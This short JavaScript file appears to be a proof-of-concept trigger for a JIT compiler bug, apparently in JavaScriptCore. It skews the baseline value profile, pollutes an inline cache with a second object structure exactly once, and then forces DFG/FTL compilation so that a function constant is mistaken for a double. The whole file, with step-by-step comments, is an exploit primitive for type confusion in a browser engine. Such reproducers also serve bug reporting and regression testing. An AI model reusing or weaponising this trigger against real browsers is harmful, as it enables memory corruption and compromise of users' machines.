let proto = { prop: function() {} };
let obj1 = Object.create(proto); // Structure A: Property is Constant:Function
let obj2 = Object.create(proto);
obj2.prop = NaN;                 // Structure B: Property is Load:0

function trigger(arr) {
    let res = 0;
    for (let i = 0; i < arr.length; i++) {
        let val = arr[i].prop;
        // Math.min forces a DoubleRepUse edge
        res += Math.min(val, 1.0);
    }
    return res;
}

// 1. Warm up Baseline JIT with Structure B only.
// This sets up the ValueProfile to predict DoublePureNaN.
let arr_warmup = new Array(100).fill(obj2);
for (let i = 0; i < 5; i++) trigger(arr_warmup);

// 2. Populate the IC with Structure A EXACTLY ONCE.
// We put it at the beginning of the array, followed by Structure B.
// By the time the basic block finishes and ValueProfile is flushed,
// the bucket contains NaN from obj2!
let arr_once = [obj1, obj2, obj2, obj2, obj2];
trigger(arr_once);

// 3. Trigger DFG/FTL compilation.
// The DFG will see the IC has both structures, but the ValueProfile ONLY predicts Number.
// This generates a MultiGetByOffset with a Constant:Function, but predicting Number.
// DFGValueRepReductionPhase will try to convert the Constant:Function to a double.
let arr_dfg = new Array(1000).fill(obj2);
for (let i = 0; i < 1000; i++) trigger(arr_dfg);
